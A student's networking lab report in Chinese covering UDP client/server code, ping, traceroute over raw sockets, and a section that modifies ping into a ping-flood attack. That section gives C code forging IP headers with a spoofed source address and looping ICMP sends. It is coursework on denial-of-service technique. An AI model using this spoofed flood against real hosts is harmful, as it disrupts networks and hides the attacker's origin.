<!DOCTYPE html>
<html>
<head>
<title>report.md</title>
<meta http-equiv="Content-type" content="text/html;charset=UTF-8">

<style>
/* https://github.com/microsoft/vscode/blob/master/extensions/markdown-language-features/media/markdown.css */
/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Microsoft Corporation. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

body {
	font-family: var(--vscode-markdown-font-family, -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif);
	font-size: var(--vscode-markdown-font-size, 14px);
	padding: 0 26px;
	line-height: var(--vscode-markdown-line-height, 22px);
	word-wrap: break-word;
}

#code-csp-warning {
	position: fixed;
	top: 0;
	right: 0;
	color: white;
	margin: 16px;
	text-align: center;
	font-size: 12px;
	font-family: sans-serif;
	background-color:#444444;
	cursor: pointer;
	padding: 6px;
	box-shadow: 1px 1px 1px rgba(0,0,0,.25);
}

#code-csp-warning:hover {
	text-decoration: none;
	background-color:#007acc;
	box-shadow: 2px 2px 2px rgba(0,0,0,.25);
}

body.scrollBeyondLastLine {
	margin-bottom: calc(100vh - 22px);
}

body.showEditorSelection .code-line {
	position: relative;
}

body.showEditorSelection .code-active-line:before,
body.showEditorSelection .code-line:hover:before {
	content: "";
	display: block;
	position: absolute;
	top: 0;
	left: -12px;
	height: 100%;
}

body.showEditorSelection li.code-active-line:before,
body.showEditorSelection li.code-line:hover:before {
	left: -30px;
}

.vscode-light.showEditorSelection .code-active-line:before {
	border-left: 3px solid rgba(0, 0, 0, 0.15);
}

.vscode-light.showEditorSelection .code-line:hover:before {
	border-left: 3px solid rgba(0, 0, 0, 0.40);
}

.vscode-light.showEditorSelection .code-line .code-line:hover:before {
	border-left: none;
}

.vscode-dark.showEditorSelection .code-active-line:before {
	border-left: 3px solid rgba(255, 255, 255, 0.4);
}

.vscode-dark.showEditorSelection .code-line:hover:before {
	border-left: 3px solid rgba(255, 255, 255, 0.60);
}

.vscode-dark.showEditorSelection .code-line .code-line:hover:before {
	border-left: none;
}

.vscode-high-contrast.showEditorSelection .code-active-line:before {
	border-left: 3px solid rgba(255, 160, 0, 0.7);
}

.vscode-high-contrast.showEditorSelection .code-line:hover:before {
	border-left: 3px solid rgba(255, 160, 0, 1);
}

.vscode-high-contrast.showEditorSelection .code-line .code-line:hover:before {
	border-left: none;
}

img {
	max-width: 100%;
	max-height: 100%;
}

a {
	text-decoration: none;
}

a:hover {
	text-decoration: underline;
}

a:focus,
input:focus,
select:focus,
textarea:focus {
	outline: 1px solid -webkit-focus-ring-color;
	outline-offset: -1px;
}

hr {
	border: 0;
	height: 2px;
	border-bottom: 2px solid;
}

h1 {
	padding-bottom: 0.3em;
	line-height: 1.2;
	border-bottom-width: 1px;
	border-bottom-style: solid;
}

h1, h2, h3 {
	font-weight: normal;
}

table {
	border-collapse: collapse;
}

table > thead > tr > th {
	text-align: left;
	border-bottom: 1px solid;
}

table > thead > tr > th,
table > thead > tr > td,
table > tbody > tr > th,
table > tbody > tr > td {
	padding: 5px 10px;
}

table > tbody > tr + tr > td {
	border-top: 1px solid;
}

blockquote {
	margin: 0 7px 0 5px;
	padding: 0 16px 0 10px;
	border-left-width: 5px;
	border-left-style: solid;
}

code {
	font-family: Menlo, Monaco, Consolas, "Droid Sans Mono", "Courier New", monospace, "Droid Sans Fallback";
	font-size: 1em;
	line-height: 1.357em;
}

body.wordWrap pre {
	white-space: pre-wrap;
}

pre:not(.hljs),
pre.hljs code > div {
	padding: 16px;
	border-radius: 3px;
	overflow: auto;
}

pre code {
	color: var(--vscode-editor-foreground);
	tab-size: 4;
}

/** Theming */

.vscode-light pre {
	background-color: rgba(220, 220, 220, 0.4);
}

.vscode-dark pre {
	background-color: rgba(10, 10, 10, 0.4);
}

.vscode-high-contrast pre {
	background-color: rgb(0, 0, 0);
}

.vscode-high-contrast h1 {
	border-color: rgb(0, 0, 0);
}

.vscode-light table > thead > tr > th {
	border-color: rgba(0, 0, 0, 0.69);
}

.vscode-dark table > thead > tr > th {
	border-color: rgba(255, 255, 255, 0.69);
}

.vscode-light h1,
.vscode-light hr,
.vscode-light table > tbody > tr + tr > td {
	border-color: rgba(0, 0, 0, 0.18);
}

.vscode-dark h1,
.vscode-dark hr,
.vscode-dark table > tbody > tr + tr > td {
	border-color: rgba(255, 255, 255, 0.18);
}

</style>

<style>
/* Tomorrow Theme */
/* http://jmblog.github.com/color-themes-for-google-code-highlightjs */
/* Original theme - https://github.com/chriskempson/tomorrow-theme */

/* Tomorrow Comment */
.hljs-comment,
.hljs-quote {
	color: #8e908c;
}

/* Tomorrow Red */
.hljs-variable,
.hljs-template-variable,
.hljs-tag,
.hljs-name,
.hljs-selector-id,
.hljs-selector-class,
.hljs-regexp,
.hljs-deletion {
	color: #c82829;
}

/* Tomorrow Orange */
.hljs-number,
.hljs-built_in,
.hljs-builtin-name,
.hljs-literal,
.hljs-type,
.hljs-params,
.hljs-meta,
.hljs-link {
	color: #f5871f;
}

/* Tomorrow Yellow */
.hljs-attribute {
	color: #eab700;
}

/* Tomorrow Green */
.hljs-string,
.hljs-symbol,
.hljs-bullet,
.hljs-addition {
	color: #718c00;
}

/* Tomorrow Blue */
.hljs-title,
.hljs-section {
	color: #4271ae;
}

/* Tomorrow Purple */
.hljs-keyword,
.hljs-selector-tag {
	color: #8959a8;
}

.hljs {
	display: block;
	overflow-x: auto;
	color: #4d4d4c;
	padding: 0.5em;
}

.hljs-emphasis {
	font-style: italic;
}

.hljs-strong {
	font-weight: bold;
}
</style>

<style>
/*
 * Markdown PDF CSS
 */

 body {
	font-family: -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif, "Meiryo";
	padding: 0 12px;
}

pre {
	background-color: #f8f8f8;
	border: 1px solid #cccccc;
	border-radius: 3px;
	overflow-x: auto;
	white-space: pre-wrap;
	overflow-wrap: break-word;
}

pre:not(.hljs) {
	padding: 23px;
	line-height: 19px;
}

blockquote {
	background: rgba(127, 127, 127, 0.1);
	border-color: rgba(0, 122, 204, 0.5);
}

.emoji {
	height: 1.4em;
}

code {
	font-size: 14px;
	line-height: 19px;
}

/* for inline code */
:not(pre):not(.hljs) > code {
	color: #C9AE75; /* Change the old color so it seems less like an error */
	font-size: inherit;
}

/* Page Break : use <div class="page"/> to insert page break
-------------------------------------------------------- */
.page {
	page-break-after: always;
}

</style>

<script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
</head>
<body>
  <script>
    mermaid.initialize({
      startOnLoad: true,
      theme: document.body.classList.contains('vscode-dark') || document.body.classList.contains('vscode-high-contrast')
          ? 'dark'
          : 'default'
    });
  </script>
<h1 id="%E5%AE%9E%E9%AA%8C%E4%B8%80-%E4%BC%A0%E8%BE%93%E5%B1%82%E5%AE%9E%E9%AA%8C-%E8%AE%A1%E7%A1%952109--2171960--%E5%BE%90%E6%96%87%E6%98%8A">实验一 传输层实验 计硕2109 / 2171960 / 徐文昊</h1>
<ul>
<li><a href="#%E5%AE%9E%E9%AA%8C%E4%B8%80-%E4%BC%A0%E8%BE%93%E5%B1%82%E5%AE%9E%E9%AA%8C-%E8%AE%A1%E7%A1%952109--2171960--%E5%BE%90%E6%96%87%E6%98%8A">实验一 传输层实验 计硕2109 / 2171960 / 徐文昊</a>
<ul>
<li><a href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">环境搭建</a></li>
<li><a href="#%E4%BB%BB%E5%8A%A1-1-clientc-%E5%92%8C-serverc">任务 1: client.c 和 server.c</a>
<ul>
<li><a href="#%E8%B0%83%E8%AF%95-clientc-%E5%92%8C-serverc">调试 client.c 和 server.c</a></li>
<li><a href="#%E5%AE%9E%E7%8E%B0%E5%9F%BA%E4%BA%8E-udp-%E7%9A%84-serverc-%E4%B8%8E-clientc">实现基于 UDP 的 server.c 与 client.c</a></li>
</ul>
</li>
<li><a href="#%E4%BB%BB%E5%8A%A1-2-pingc">任务 2: ping.c</a>
<ul>
<li><a href="#%E8%B0%83%E8%AF%95-pingc">调试 ping.c</a></li>
<li><a href="#%E4%BF%AE%E6%94%B9-pingc%E4%BD%BF%E5%85%B6%E6%94%AF%E6%8C%81-ping-%E6%94%BB%E5%87%BB">修改 ping.c，使其支持 ping 攻击</a></li>
</ul>
</li>
<li><a href="#%E4%BB%BB%E5%8A%A1-3-traceroutec">任务 3: traceroute.c</a>
<ul>
<li><a href="#%E8%B0%83%E8%AF%95-traceroutec">调试 traceroute.c</a></li>
<li><a href="#%E5%9F%BA%E4%BA%8E-raw-socket-%E7%BC%96%E5%86%99%E5%9F%BA%E4%BA%8E-udp-%E7%9A%84-traceroutec">基于 Raw Socket, 编写基于 UDP 的 traceroute.c</a></li>
</ul>
</li>
<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
</ul>
</li>
</ul>
<h2 id="%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">环境搭建</h2>
<table>
<thead>
<tr>
<th>OS</th>
<th>Editor</th>
<th>Compiler</th>
</tr>
</thead>
<tbody>
<tr>
<td>Windows 10</td>
<td>Visual Studio Code</td>
<td>MinGW</td>
</tr>
</tbody>
</table>
<h2 id="%E4%BB%BB%E5%8A%A1-1-clientc-%E5%92%8C-serverc">任务 1: client.c 和 server.c</h2>
<p>上机调试 client.c 和 server.c, 编写基于 UDP 的 client.c 和 server.c.</p>
<h3 id="%E8%B0%83%E8%AF%95-clientc-%E5%92%8C-serverc">调试 client.c 和 server.c</h3>
<p>client.c 与 server.c 是基于 TCP 协议的客户端/服务器的 C 语言实现。</p>
<p>整个过程可以分解为以下步骤：</p>
<p><img src="https://media.geeksforgeeks.org/wp-content/uploads/Socket_server-1.png" alt="TCP server-client steps"></p>
<p>其中 TCP Server 执行：</p>
<ol>
<li>调用 <code>create()</code>, 创建一个 TCP socket.</li>
<li>调用 <code>bind()</code>, 将此 Socket 绑定到特定地址.</li>
<li>调用 <code>listen()</code>, 将服务器套接字置于监听模式，等待客户端向服务器建立连接.</li>
<li>调用 <code>accept()</code>, 此时，客户机和服务器之间建立了连接，它们已经准备好传输数据.</li>
<li>返回执行步骤 3.</li>
</ol>
<p>TCP Client 执行：</p>
<ol>
<li>创建 TCP Socket。</li>
<li>连接新创建的客户端 Socket 到服务器。</li>
</ol>
<p>调试结果：</p>
<p><a href="https://imgtu.com/i/I6LToQ"><img src="https://z3.ax1x.com/2021/11/14/I6LToQ.md.png" alt="tcp/udp client result"></a></p>
<h3 id="%E5%AE%9E%E7%8E%B0%E5%9F%BA%E4%BA%8E-udp-%E7%9A%84-serverc-%E4%B8%8E-clientc">实现基于 UDP 的 server.c 与 client.c</h3>
<p>在 UDP 中，客户端不会像 TCP 中那样与服务器建立连接，而只是发送一个数据报。同样，服务器不需要接受连接，只需等待数据报到达。数据报在到达时包含发送方的地址，服务器使用该地址将数据发送到正确的客户机。</p>
<p>其通信逻辑如下图。</p>
<p><img src="https://media.geeksforgeeks.org/wp-content/uploads/udpfuncdiag.png" alt="UDP process"></p>
<p>其中 UDP Server 执行：</p>
<ol>
<li>创建 UDP Socket.</li>
<li>将 Socket 绑定到服务器地址。</li>
<li>等待来自客户端的数据报包到达。</li>
<li>处理数据报包并向客户端发送应答。</li>
<li>返回步骤 3.</li>
</ol>
<p>UDP Client 执行：</p>
<ol>
<li>创建 UDP Socket.</li>
<li>向服务器发送消息。</li>
<li>等待，直到接收到来自服务器的响应。</li>
<li>如果有必要，处理回复并返回到步骤2。</li>
<li>关闭套接字描述符并退出。</li>
</ol>
<p>UDP Server 关键代码.</p>
<pre class="hljs"><code><div> <span class="hljs-comment">// setup an UDP socket</span>
    SOCKET socket_fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    <span class="hljs-keyword">if</span> (socket_fd == INVALID_SOCKET) {
        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"create socket with error: %d\n"</span>, WSAGetLastError());
        <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;
    }

    SOCKADDR_IN server_addr, client_addr;
    <span class="hljs-built_in">memset</span>(&amp;server_addr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(server_addr));
    <span class="hljs-built_in">memset</span>(&amp;client_addr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(client_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.S_un.S_addr = htonl(INADDR_ANY);
    server_addr.sin_port = htons(port);

    <span class="hljs-comment">// bind the fd to a specific address</span>
    err = bind(socket_fd, (SOCKADDR *)&amp;server_addr, <span class="hljs-keyword">sizeof</span>(SOCKADDR));
    <span class="hljs-keyword">if</span> (err != <span class="hljs-number">0</span>) {
        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"bind with error: %d\n"</span>, WSAGetLastError());
        <span class="hljs-keyword">return</span> <span class="hljs-number">3</span>;
    }

    <span class="hljs-comment">// Keep listening the data</span>
    <span class="hljs-keyword">int</span> client_len = <span class="hljs-keyword">sizeof</span>(client_addr);
    <span class="hljs-keyword">char</span> msg[MSG_LEN];
    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {
        err = recvfrom(socket_fd, msg, MSG_LEN, <span class="hljs-number">0</span>, (SOCKADDR *)&amp;client_addr, &amp;client_len);
        <span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>) {
            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"recvfrom with error: %d\n"</span>, err);
            <span class="hljs-keyword">return</span> <span class="hljs-number">4</span>;
        }

        <span class="hljs-built_in">sprintf</span>(msg, <span class="hljs-string">"服务器已被连接 %d 次\n"</span>, ++visits);
        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stdout</span>, msg);

        err = sendto(socket_fd, msg, <span class="hljs-built_in">strlen</span>(msg), <span class="hljs-number">0</span>, (SOCKADDR *)&amp;client_addr, client_len);
        <span class="hljs-keyword">if</span> (err == SOCKET_ERROR) {
            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"sendto with error: %d\n"</span>, err);
            <span class="hljs-keyword">return</span> <span class="hljs-number">5</span>;
        }
    }
</div></code></pre>
<p>UDP Client 关键代码.</p>
<pre class="hljs"><code><div><span class="hljs-comment">// setup an UDP socket</span>
    SOCKET socket_fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    <span class="hljs-keyword">if</span> (socket_fd == INVALID_SOCKET) {
        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"create socket with error: %d\n"</span>, WSAGetLastError());
        <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;
    }

    SOCKADDR_IN server_addr;
    <span class="hljs-built_in">memset</span>(&amp;server_addr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.S_un.S_addr = inet_addr(ip);
    server_addr.sin_port = htons(port);

    <span class="hljs-comment">// send a message to the server</span>
    <span class="hljs-keyword">int</span> server_len = <span class="hljs-keyword">sizeof</span>(server_addr);
    <span class="hljs-keyword">char</span> *msg = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span>) * MSG_LEN);
    <span class="hljs-built_in">strcpy</span>(msg, <span class="hljs-string">"Hello World!"</span>);
    err = sendto(socket_fd, msg, <span class="hljs-built_in">strlen</span>(msg), <span class="hljs-number">0</span>, (SOCKADDR *)&amp;server_addr,
                 server_len);
    <span class="hljs-keyword">if</span> (err == SOCKET_ERROR) {
        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"sendto with error: %d\n"</span>, err);
        <span class="hljs-keyword">return</span> <span class="hljs-number">3</span>;
    }

    <span class="hljs-comment">// receive the response</span>
    err = recvfrom(socket_fd, msg, MSG_LEN, <span class="hljs-number">0</span>, (SOCKADDR *)&amp;server_addr,
                   &amp;server_len);
    <span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>) {
        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"recvfrom with error: %d\n"</span>, err);
        <span class="hljs-keyword">return</span> <span class="hljs-number">4</span>;
    }
</div></code></pre>
<p>执行结果：</p>
<p><a href="https://imgtu.com/i/I6X2KP"><img src="https://z3.ax1x.com/2021/11/14/I6X2KP.md.png" alt="I6X2KP.md.png"></a></p>
<h2 id="%E4%BB%BB%E5%8A%A1-2-pingc">任务 2: ping.c</h2>
<h3 id="%E8%B0%83%E8%AF%95-pingc">调试 ping.c</h3>
<p><strong>Background</strong>: ping.c 是一个基本的 Internet 工具，允许用户验证特定的 IP 地址是否存在，并且可以使用其他工具接受请求。Ping 通过打开一个 Raw Socket 发送 ICMP 数据包，这个套接字独立于 TCP 和 UDP。因为 IP 没有任何发送错误和控制消息的内置机制。它依赖于互联网控制消息协议(ICMP)来提供错误控制。它用于报告错误和管理查询。</p>
<p><strong>Work Mechanism</strong>: Ping 程序的工作原理很像声纳回波定位，它向指定的计算机发送一个包含 ICMP ECHO_REQUEST 的 Packet，然后该计算机再发送一个 ECHO_REPLY 包作为回应。该数据包具有一个 TTL (存活时间)值，该值决定路由器的最大跃点数。如果数据包没有到达目的地，那么发送者就会收到错误提示。错误类型如下:</p>
<ol>
<li>TTL 在过境时过期</li>
<li>目标主机不可到达</li>
<li>请求超时，即没有答复</li>
<li>未知宿主</li>
</ol>
<p>下面是一个简单的 ping 程序的步骤:</p>
<ol>
<li>输入一个主机名。</li>
<li>进行 DNS 查找。DNS 查找可以使用 gethostbyname ()完成。函数的作用是: 转换一个正常的人类可读的网站，并返回一个类型主机的结构，其中包含二进制点表示形式的 IP 地址和地址类型。</li>
<li>使用 SOCK_Raw 和 IPPROTO_IMCP 协议打开一个 Raw Scoket。需要 sudo.</li>
<li>Sending loop:
<ol>
<li>设置 TTL。TTL 值设置为限制一个数据包可以产生的跳数。</li>
<li>设置 recv 函数的超时。如果没有设置超时，将会死循环。</li>
<li>填充 ICMP Packet.
<ol>
<li>将包头类型设置为 ICMP_ECHO。</li>
<li>将 id 设置为进程的 pid</li>
<li>随机填充 message.</li>
<li>计算校验和并填写。</li>
</ol>
</li>
<li>发送 Packet.</li>
<li>等待它被接收。</li>
</ol>
</li>
</ol>
<h3 id="%E4%BF%AE%E6%94%B9-pingc%E4%BD%BF%E5%85%B6%E6%94%AF%E6%8C%81-ping-%E6%94%BB%E5%87%BB">修改 ping.c，使其支持 ping 攻击</h3>
<p>From wikipedia：</p>
<blockquote>
<p>A ping flood is a simple denial-of-service attack where the attacker overwhelms the victim with ICMP &quot;echo request&quot; (ping) packets. This is most effective by using the flood option of ping which sends ICMP packets as fast as possible without waiting for replies. Most implementations of ping require the user to be privileged in order to specify the flood option. It is most su&gt;ccessful if the attacker has more bandwidth than the victim (for instance an attacker with a DSL line and the victim on a dial-up modem). The attacker hopes that the victim will respond with ICMP &quot;echo reply&quot; packets, thus consuming both outgoing bandwidth as well as incoming bandwidth. If the target system is slow enough, it is possible to consume enough of its CPU cycles for a user to notice a significant slowdown.</p>
</blockquote>
<p>Ping Floods steps:</p>
<ol>
<li>通过 SOCK_RAW 和 IPPROTO_RAW  打开一个 Row Socket, 指定 IP_HDRINCL 为 1, 允许我们直接编辑 IP Header 与 Packet.</li>
<li>伪造一个 IP Header，使用虚假的 Source IP.</li>
<li>填充 ICMP Header.</li>
<li>发送 Packet，无需等待回复。(Because of fake IP header...)</li>
</ol>
<p>部分核心代码：</p>
<pre class="hljs"><code><div>
  <span class="hljs-comment">// The starting address of the whole packet is the starting address of the</span>
    <span class="hljs-comment">// IPHeader</span>
    IPHeader *ip = (IPHeader *)packet;
    ip-&gt;version = <span class="hljs-number">4</span>;
    ip-&gt;ip_header_length = <span class="hljs-number">5</span>;
    ip-&gt;type_of_service = <span class="hljs-number">0</span>;
    ip-&gt;time_to_live = <span class="hljs-number">255</span>;
    ip-&gt;total_length = htons(packet_size);
    ip-&gt;id = rand();
    ip-&gt;fragment_offset = <span class="hljs-number">0</span>;
    ip-&gt;saddr.s_addr = inet_addr(source_ip);
    ip-&gt;daddr.s_addr = inet_addr(dest_ip);
    ip-&gt;protocol = IPPROTO_ICMP;

    <span class="hljs-comment">/*
       Step 2: build ICMP header.
       The beginning of the ICMP header is offset sizeof(IPHeader) bytes
       backward from the packet’s beginning.
     */</span>
    ICMPHeader *icmp = (ICMPHeader *)(packet + (<span class="hljs-keyword">sizeof</span>(IPHeader)));
    icmp-&gt;type = ICMP_ECHO;
    icmp-&gt;code = <span class="hljs-number">0</span>;
    icmp-&gt;id = rand();
    icmp-&gt;checksum = <span class="hljs-number">0</span>;

     <span class="hljs-comment">/*
       Step 6: send packet with random data in ping loop.
     */</span>
    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">"Starting Ping flood attack. Terminated by Ctrl+c...\n"</span>);
    <span class="hljs-keyword">int</span> cnt = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">while</span> (KEEP_RUNNING) {
        <span class="hljs-comment">// reset ICMP data</span>
        <span class="hljs-built_in">memset</span>(packet + <span class="hljs-keyword">sizeof</span>(IPHeader) + <span class="hljs-keyword">sizeof</span>(ICMPHeader), rand() % <span class="hljs-number">255</span>,
               payload_size);
        <span class="hljs-comment">// recalculate the ICMP header checksum since we are filling the ICMP</span>
        <span class="hljs-comment">// data with random data</span>
        icmp-&gt;checksum = <span class="hljs-number">0</span>;
        icmp-&gt;checksum =
            checksum((<span class="hljs-keyword">unsigned</span> short *)icmp, <span class="hljs-keyword">sizeof</span>(ICMPHeader) + payload_size);

        err = sendto(socket_fd, packet, packet_size, <span class="hljs-number">0</span>,
                     (struct sockaddr *)&amp;dest, <span class="hljs-keyword">sizeof</span>(dest));
        <span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>) {
            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"sendto failed with error: %d\n"</span>,
                    WSAGetLastError());
            ExitProcess(STATUS_FAILED);
        }
        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">"sent %d packet(s).\n"</span>, ++cnt);
        Sleep(<span class="hljs-number">1000</span>);
    }
</div></code></pre>
<p>运行结果:</p>
<p><a href="https://imgtu.com/i/IcpBUf"><img src="https://z3.ax1x.com/2021/11/14/IcpBUf.md.png" alt="ping result"></a></p>
<h2 id="%E4%BB%BB%E5%8A%A1-3-traceroutec">任务 3: traceroute.c</h2>
<h3 id="%E8%B0%83%E8%AF%95-traceroutec">调试 traceroute.c</h3>
<p>Traceroute 的基本原理是向外发送带有逐次递增 TTL 的数据包从而获取的路径中每一跳的信息。<br>
Host A 向 Host B 做 traceroute，Host A 第一次会发出一个 TTL=1 的数据包，当该数据包到达 R1 时，TTL 会变为 0 （网络上每经过一跳 TTL 会减去 1），R1 会将 TTL=0 的数据包丢弃并返回一个 ICMP Time Exceeded 给 Host A。Host A 发出第二个数据包并将 TTL 增加1 （TTL=2)，该数据包到达 R2 后 TTL=0，R2 向 Host A 返回 ICMP Time Exceeded。依此类推，直到 TTL 增加到一个合适的值让数据包顺利到达 Host B，Host B 会返回一个 Final Replay 给 Host A。</p>
<p><a href="https://imgtu.com/i/IcP62D"><img src="https://z3.ax1x.com/2021/11/14/IcP62D.md.jpg" alt="IcP62D.md.jpg"></a></p>
<p>基于 ICMP 的 traceroute.c，通过发送 ICMP ECHO REQUEST，接受 ICMP ECHO REPLY 来实现。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/5337919-d1900102224993c8.png?imageMogr2/auto-orient/strip|imageView2/2/w/631/format/webp" alt="icmp traceroute"></p>
<p>调试运行结果：</p>
<p><a href="https://imgtu.com/i/IcFGX4"><img src="https://z3.ax1x.com/2021/11/14/IcFGX4.md.png" alt="traceroute result"></a></p>
<h3 id="%E5%9F%BA%E4%BA%8E-raw-socket-%E7%BC%96%E5%86%99%E5%9F%BA%E4%BA%8E-udp-%E7%9A%84-traceroutec">基于 Raw Socket, 编写基于 UDP 的 traceroute.c</h3>
<p>与基于 ICMP 的 traceroute 相比，其主要区别如下。</p>
<table>
<thead>
<tr>
<th>Protocol</th>
<th>Packet</th>
<th>Routing Reply</th>
<th>Final Reply</th>
</tr>
</thead>
<tbody>
<tr>
<td>ICMP</td>
<td>ICMP Echo Request</td>
<td>ICMP Timeout</td>
<td>ICMP Echo Reply</td>
</tr>
<tr>
<td>UDP</td>
<td>UDP Packet</td>
<td>ICMP Timeout</td>
<td>ICMP Destination Unreachable</td>
</tr>
</tbody>
</table>
<p>其执行流程如下图。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/5337919-2c9b516a52aeb3bb.png?imageMogr2/auto-orient/strip|imageView2/2/w/626/format/webp" alt="udp traceroute"></p>
<p>主要实现步骤：</p>
<ol>
<li>构建 IP 与 UDP 报头。</li>
<li>打开 2 个 Socket: 一个用于在 SOCK_RAW 模式下发送 UDP 数据包(用于操作 TTL)，另一个用于从各级路由处接收 ICMP 应答。</li>
<li>在循环中，调用 <code>sendto()</code>, 发送 UDP Packet, 端口为 33434.</li>
<li>将之前创建的 ICMP Socket 绑定到指定地址，持续接收并处理 ICMP 应答消息，若是 ICMP 报头中的 type 等于 3，也就是 ICMP Destination Unreachable 时，traceroute 结束。</li>
</ol>
<p>核心代码：</p>
<pre class="hljs"><code><div><span class="hljs-comment">/*
   修改 ICMP decode 函数，在 case ICMP_DESTUNREACH 这种情况返回 1，意味着 traceroute 执行完毕。
 */</span>
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">decode_resp</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *buf, <span class="hljs-keyword">int</span> bytes, SOCKADDR_IN *from, <span class="hljs-keyword">int</span> ttl)</span> </span>{
    IpHeader *iphdr = <span class="hljs-literal">NULL</span>;
    IcmpHeader *icmphdr = <span class="hljs-literal">NULL</span>;
    <span class="hljs-keyword">unsigned</span> short iphdrlen;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hostent</span> *<span class="hljs-title">lpHostent</span> = <span class="hljs-title">NULL</span>;</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">in_addr</span> <span class="hljs-title">inaddr</span> = <span class="hljs-title">from</span>-&gt;<span class="hljs-title">sin_addr</span>;</span>
    iphdr = (IpHeader *)buf;
    <span class="hljs-comment">// Number of 32-bit words * 4 = bytes</span>
    iphdrlen = iphdr-&gt;h_len * <span class="hljs-number">4</span>;
    <span class="hljs-keyword">if</span> (bytes &lt; iphdrlen + ICMP_MIN)
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Too few bytes from %s\n"</span>, inet_ntoa(from-&gt;sin_addr));
    icmphdr = (IcmpHeader *)(buf + iphdrlen);
    <span class="hljs-keyword">switch</span> (icmphdr-&gt;i_type) {
    <span class="hljs-keyword">case</span> ICMP_ECHOREPLY: <span class="hljs-comment">// Response from destination</span>
        lpHostent = gethostbyaddr((<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *)&amp;from-&gt;sin_addr, AF_INET,
                                  <span class="hljs-keyword">sizeof</span>(struct in_addr));
        <span class="hljs-keyword">if</span> (lpHostent != <span class="hljs-literal">NULL</span>)
            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%2d  %s (%s)\n"</span>, ttl, lpHostent-&gt;h_name, inet_ntoa(inaddr));
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
        <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> ICMP_TIMEOUT: <span class="hljs-comment">// Response from router along the way</span>
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%2d  %s\n"</span>, ttl, inet_ntoa(inaddr));
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
        <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> ICMP_DESTUNREACH: <span class="hljs-comment">// Can't reach the destination at all</span>
        <span class="hljs-comment">// printf("%2d  %s  reports: Host is unreachable\n", ttl,</span>
        <span class="hljs-comment">//        inet_ntoa(inaddr));</span>
        lpHostent = gethostbyaddr((<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *)&amp;from-&gt;sin_addr, AF_INET,
                                  <span class="hljs-keyword">sizeof</span>(struct in_addr));
        <span class="hljs-keyword">if</span> (lpHostent != <span class="hljs-literal">NULL</span>)
            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%2d  %s (%s) received final reply ICMP_DESTUNREACH\n"</span>, ttl, lpHostent-&gt;h_name, inet_ntoa(inaddr));
        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
        <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">default</span>:
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"non-echo type %d recvd\n"</span>, icmphdr-&gt;i_type);
        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
        <span class="hljs-keyword">break</span>;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}


<span class="hljs-comment">// 填充 UDP 数据，设定端口</span>
<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">fill_udp_data</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *udp_data, <span class="hljs-keyword">int</span> datasize)</span></span>{
    UdpHeader *udp_header;
    <span class="hljs-keyword">char</span> *datapart;
